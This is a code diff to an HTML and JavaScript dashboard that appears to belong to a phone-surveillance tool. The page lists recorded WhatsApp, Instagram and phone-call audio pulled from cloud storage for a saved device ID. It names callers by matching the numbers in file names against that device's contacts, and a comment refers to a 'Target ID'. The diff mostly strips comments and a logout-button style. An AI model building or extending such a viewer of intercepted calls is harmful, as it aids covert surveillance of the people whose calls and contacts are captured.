@@ -43,11 +43,11 @@
 
         .title { font-size: 1.2rem; font-weight: 600; letter-spacing: 0.5px; display: flex; align-items: center; gap: 10px; }
 
-        /* --- UPDATED: Green Live Badge --- */
+        /* --- Green Live Badge --- */
         .live-badge {
             font-size: 0.7rem; 
             background: rgba(48, 209, 88, 0.15); /* Green BG */
-            color: var(--accent-green);          /* Green Text */
+            color: var(--accent-green);           /* Green Text */
             padding: 4px 10px; border-radius: 20px; 
             border: 1px solid rgba(48, 209, 88, 0.3);
             display: flex; align-items: center; gap: 6px;
@@ -65,19 +65,6 @@
             70% { box-shadow: 0 0 0 6px rgba(48, 209, 88, 0); }
             100% { box-shadow: 0 0 0 0 rgba(48, 209, 88, 0); }
         }
-
-        /* Target ID Removed visually */
-        .device-info-bar {
-            display: flex; justify-content: flex-end; /* Right align button */
-            padding: 0 5px;
-        }
-
-        .logout-btn {
-            background: rgba(255, 59, 48, 0.1); border: 1px solid rgba(255, 59, 48, 0.3); color: var(--accent-red);
-            padding: 6px 12px; border-radius: 5px; font-size: 0.75rem; cursor: pointer;
-            font-weight: 600;
-        }
-        .logout-btn:hover { background: rgba(255, 59, 48, 0.2); }
 
         .filters {
             display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none;
@@ -149,8 +136,6 @@
             </div>
         </div>
 
-     
-
         <div class="filters">
             <div class="filter-pill active" onclick="filterBy('All', this)">All</div>
             <div class="filter-pill" onclick="filterBy('WhatsApp', this)">WhatsApp</div>
@@ -181,7 +166,7 @@
 
             currentDeviceId = savedID;
 
-            // 1. Contacts Load (Zaroori hai Name match karne ke liye)
+            // 1. Contacts Load
             loadLocalContacts();
 
             // 2. Fetch Audio
@@ -203,39 +188,29 @@
             }
         }
 
-        // --- NAME MATCHING LOGIC (UPDATED) ---
+        // --- NAME MATCHING LOGIC ---
         function getDisplayName(filename) {
             if(!filename) return "Unknown";
 
-            // 1. Agar filename me number hai (e.g. Call_9876543210.mp3)
-            // Hum 5 digit se lamba koi bhi number dhundenge
             const numberMatch = filename.match(/(\d{6,})/); 
             
             if (numberMatch) {
-                let foundNumber = numberMatch[0]; // Ye wo number hai jo file name me mila
+                let foundNumber = numberMatch[0];
 
-                // Local Contacts me dhundo
                 const contact = localContacts.find(c => {
                     if (!c.number && !c.phone) return false;
-                    
-                    // Contact list wale number ko clean karo (sirf digits)
                     let cNum = (c.number || c.phone).replace(/\D/g, '');
-                    // Filename wale number ko clean karo
                     let fileNum = foundNumber.replace(/\D/g, '');
-
-                    // Check karo agar wo match hote hain (last 10 digits compare karna safe hai)
                     return cNum.includes(fileNum) || fileNum.includes(cNum);
                 });
 
                 if (contact && contact.name) {
-                    return `📞 ${contact.name}`; // Naam mil gaya!
+                    return `📞 ${contact.name}`;
                 }
                 
-                // Agar naam nahi mila, to saaf Number dikhao
                 return `Unknown (${foundNumber})`;
             }
             
-            // 2. Agar number nahi mila, to App ka naam dikhao
             const app = detectApp(filename);
             if (app === 'WhatsApp') return 'WhatsApp Call';
             if (app === 'Instagram') return 'Instagram Call';
@@ -249,7 +224,6 @@
             
             console.log("🔊 New Audio Received:", data);
             
-            // Name process karo
             const displayName = getDisplayName(data.name || data.filename);
 
             const processed = {
@@ -329,16 +303,13 @@
             });
         }
 
-       
-        }
-
         function processCloudinaryFile(file) {
             const d = new Date(file.created_at);
             const fileName = file.filename || file.public_id || "";
             
             return {
                 app: detectApp(fileName),
-                displayName: getDisplayName(fileName), // Yahan naam nikalega
+                displayName: getDisplayName(fileName),
                 date: d.toLocaleDateString(),
                 time: d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                 url: file.secure_url,
@@ -372,4 +343,3 @@
     </script>
 </body>
 </html>
-
